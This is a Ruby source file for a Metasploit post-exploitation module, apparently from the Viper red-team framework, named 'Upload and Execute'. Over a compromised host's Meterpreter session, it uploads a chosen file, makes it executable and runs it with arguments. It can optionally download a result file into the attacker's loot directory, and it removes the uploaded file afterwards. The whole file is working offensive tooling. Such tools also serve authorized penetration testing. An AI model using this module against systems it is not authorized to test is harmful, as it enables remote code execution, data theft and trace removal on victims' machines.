##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Exploit::FileDropper
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(info,
                      'Name'         => 'Upload and Execute',
                      'Description'  => %q{Push a file and execute it.},
                      'Author'       => 'viper',
                      'License'      => MSF_LICENSE,
                      'Platform'     => ['win', 'unix', 'linux', 'osx', 'bsd', 'solaris'],
                      'SessionTypes' => ['meterpreter']
          ))

    register_options([
                             OptString.new('LPATH', [true, 'Local file path to upload and execute']),
                             OptString.new('RPATH', [false, 'Remote file path on target (default is basename of LPATH)']),
                             OptString.new('RESULTFILE', [false, 'exe/elf execute result file on target']),
                             OptString.new('ARGS', [false, 'Command-line arguments to pass to the uploaded file']),
                             OptInt.new('TIMEOUT', [true, 'Timeout for command execution', 1800]),
                             OptBool.new('CLEANUP', [false, 'Cleanup upload file after exec', true]),
                     ])
  end

  def run

    if session.type == "shell"
      pub_json_result(false,
                      "Unsupport shell type",
                      nil,
                      self.uuid)
      return
    end
    if File.file?(File.join(Msf::Config.install_root, "scripts", "pe", datastore['LPATH']))
      script_path = File.join(Msf::Config.install_root, "scripts", "pe", datastore['LPATH'])
    elsif File.file?(datastore['LPATH'])
      script_path = datastore['LPATH']
    else
      pub_json_result(false,
                      "#{datastore['LPATH']} not found",
                      nil,
                      self.uuid)
      return
    end

    tmprpath = rpath
    print_status_redis("Uploading #{script_path} to #{tmprpath}")
    session.fs.file.upload_file(tmprpath, script_path)
    if session.platform == 'windows'
      # Don't use cmd.exe /c start so we can fetch output
      cmd = tmprpath
    else
      # Set 700 so only we can execute the file
      chmod(tmprpath, 0700)

      # Handle absolute paths
      cmd = tmprpath.start_with?('/') ? tmprpath : "./#{tmprpath}"
    end
    print_status_redis("Executing command: #{cmd}")
    output = cmd_exec(cmd, args, datastore['TIMEOUT'])

    if datastore['CLEANUP']
      register_file_for_cleanup(tmprpath)
    end
    if !datastore['RESULTFILE'].blank?
      resultfilepath = File.join(session.fs.dir.pwd, datastore['RESULTFILE'])
      localfile      = Time.now.to_i.to_s + "-" + datastore['RESULTFILE'].delete('/\\')
      localpath      = File.join(Msf::Config.loot_directory, localfile)
      begin
        # Download the remote file to the temporary file
        print_status_redis("Downloading #{resultfilepath} to #{localpath}")
        session.fs.file.download_file(localpath, resultfilepath, { block_size: 100 * 1024 })
        register_file_for_cleanup(resultfilepath)
      rescue Rex::Post::Meterpreter::RequestError => re
        print_error(re.to_s)
      end
    end
    pub_json_result(true,
                    localfile,
                    output,
                    self.uuid)
  end

  def lpath
    datastore['LPATH']
  end

  def rpath
    if session.platform == "windows"
      filename = '/' + Time.now.to_i.to_s + ".exe"
      # datastore['RPATH'].blank? ? get_env('TEMP') + filename : datastore['RPATH']
    else
      filename = '/' + Time.now.to_i.to_s
      # datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
    end
    # filename = '/' + Time.now.to_i.to_s
    datastore['RPATH'].blank? ? session.fs.dir.pwd + filename : datastore['RPATH']
  end

  def args
    datastore['ARGS']
  end

  def timeout
    datastore['TIMEOUT']
  end
end
